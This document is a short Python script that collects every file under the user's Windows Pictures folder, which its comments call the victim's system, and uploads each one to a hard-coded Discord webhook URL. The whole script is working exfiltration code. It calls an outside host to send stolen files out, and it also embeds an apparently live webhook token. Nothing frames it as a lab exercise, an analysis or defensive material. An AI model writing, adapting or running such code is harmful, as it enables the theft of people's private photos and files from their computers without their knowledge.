import os
import requests
import getpass

username = getpass.getuser()

TARGET_DIRECTORY = "C:/Users/" + username + "/Pictures"  # Directory on victim's system

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1207270006975635466/seINz27pJFoiVTUt4qbKnLP_1lYpDDY9CO5ClvyFiXW8_k7nsoYEGjHLMh9Kv2cDx0FY"  # Discord webhook URL to receive the exfiltrated files

def exfiltrate_files(directory, webhook_url):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                files = {'file': f}
                data = {'content': f"Exfiltrated file: {file_path}"}
                try:
                    response = requests.post(webhook_url, data=data, files=files)
                    response.raise_for_status()
                    print(f"Exfiltrated {file_path} successfully.")
                except requests.exceptions.RequestException as e:
                    print(f"Error exfiltrating {file_path} to Discord: {e}")

def main():
    exfiltrate_files(TARGET_DIRECTORY, DISCORD_WEBHOOK_URL)

if __name__ == "__main__":
    main()
